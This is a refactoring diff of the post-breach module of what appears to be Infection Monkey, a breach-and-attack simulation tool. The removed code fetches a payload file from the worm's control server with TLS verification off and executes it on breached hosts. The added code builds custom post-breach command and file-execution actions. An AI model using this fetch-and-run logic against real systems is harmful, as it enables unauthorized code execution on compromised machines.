@@ -1,20 +1,12 @@
 import logging
 import infection_monkey.config
 import platform
-from infection_monkey.control import ControlClient
-import infection_monkey.monkeyfs as monkeyfs
-from infection_monkey.config import WormConfiguration
-import requests
-import shutil
-import os
 from file_execution import FileExecution
 from pba import PBA
 
 LOG = logging.getLogger(__name__)
 
 __author__ = 'VakarisZ'
-
-DOWNLOAD_CHUNK = 1024
 
 
 # Class that handles post breach action execution
@@ -26,77 +18,49 @@ class PostBreach(object):
     def execute(self):
         for pba in self.pba_list:
             pba.run(self.os_is_linux)
+        LOG.info("Post breach actions executed")
 
-    def config_to_pba_list(self, config):
+    @staticmethod
+    def config_to_pba_list(config):
         """
-        Should return a list of PBA's generated from config. After full implementation this will pick
-        which PBA's to run.
+        Returns a list of PBA objects generated from config.
         """
         pba_list = []
-        # Get custom PBA commands from config
-        custom_pba_linux = config.custom_post_breach['linux']
-        custom_pba_windows = config.custom_post_breach['windows']
-
-        if custom_pba_linux or custom_pba_windows:
-            pba_list.append(PBA('custom_pba', custom_pba_linux, custom_pba_windows))
-
-        # Download user's pba file by providing dest. dir, filename and file size
-        if config.custom_post_breach['linux_file'] and self.os_is_linux:
-            uploaded = PostBreach.download_PBA_file(PostBreach.get_dest_dir(config, self.os_is_linux),
-                                         config.custom_post_breach['linux_file_info']['name'],
-                                         config.custom_post_breach['linux_file_info']['size'])
-            if not custom_pba_linux and uploaded:
-                pba_list.append(FileExecution("./"+config.custom_post_breach['linux_file_info']['name']))
-        elif config.custom_post_breach['windows_file'] and not self.os_is_linux:
-            uploaded = PostBreach.download_PBA_file(PostBreach.get_dest_dir(config, self.os_is_linux),
-                                         config.custom_post_breach['windows_file_info']['name'],
-                                         config.custom_post_breach['windows_file_info']['size'])
-            if not custom_pba_windows and uploaded:
-                pba_list.append(FileExecution(config.custom_post_breach['windows_file_info']['name']))
+        pba_list.extend(PostBreach.get_custom(config))
 
         return pba_list
 
     @staticmethod
-    def download_PBA_file(dst_dir, filename, size):
-        PBA_file_v_path = PostBreach.download_PBA_file_to_vfs(filename, size)
-        try:
-            with monkeyfs.open(PBA_file_v_path, "rb") as downloaded_PBA_file:
-                with open(os.path.join(dst_dir, filename), 'wb') as written_PBA_file:
-                    shutil.copyfileobj(downloaded_PBA_file, written_PBA_file)
-            return True
-        except IOError as e:
-            LOG.error("Can not download post breach file to target machine, because %s" % e)
-            return False
+    def get_custom(config):
+        custom_list = []
+        file_pba = FileExecution()
+        command_pba = PBA(name="Custom post breach action")
+        post_breach = config.custom_post_breach
+        linux_command = post_breach['linux']
+        windows_command = post_breach['windows']
 
-    @staticmethod
-    def download_PBA_file_to_vfs(filename, size):
-        if not WormConfiguration.current_server:
-            return None
-        try:
-            dest_file = monkeyfs.virtual_path(filename)
-            if (monkeyfs.isfile(dest_file)) and (size == monkeyfs.getsize(dest_file)):
-                return dest_file
+        # Add commands to linux pba
+        if post_breach['linux_file_info']['name']:
+            if linux_command:
+                file_pba.linux_command=linux_command
             else:
-                download = requests.get("https://%s/api/pba/download/%s" %
-                                        (WormConfiguration.current_server, filename),
-                                        verify=False,
-                                        proxies=ControlClient.proxies)
+                file_pba.add_default_command(is_linux=True)
+        elif linux_command:
+            command_pba.linux_command = linux_command
 
-                with monkeyfs.open(dest_file, 'wb') as file_obj:
-                    for chunk in download.iter_content(chunk_size=DOWNLOAD_CHUNK):
-                        if chunk:
-                            file_obj.write(chunk)
-                    file_obj.flush()
-                if size == monkeyfs.getsize(dest_file):
-                    return dest_file
+        # Add commands to windows pba
+        if post_breach['windows_file_info']['name']:
+            if windows_command:
+                file_pba.windows_command=windows_command
+            else:
+                file_pba.add_default_command(is_linux=False)
+        elif windows_command:
+            command_pba.windows_command = windows_command
 
-        except Exception as exc:
-            LOG.warn("Error connecting to control server %s: %s",
-                     WormConfiguration.current_server, exc)
+        # Add pba's to list
+        if file_pba.linux_command or file_pba.windows_command:
+            custom_list.append(file_pba)
+        if command_pba.windows_command or command_pba.linux_command:
+            custom_list.append(command_pba)
 
-    @staticmethod
-    def get_dest_dir(config, is_linux):
-        if is_linux:
-            return os.path.dirname(config.dropper_target_path_linux)
-        else:
-            return os.path.dirname(config.dropper_target_path_win_32)
+        return custom_list
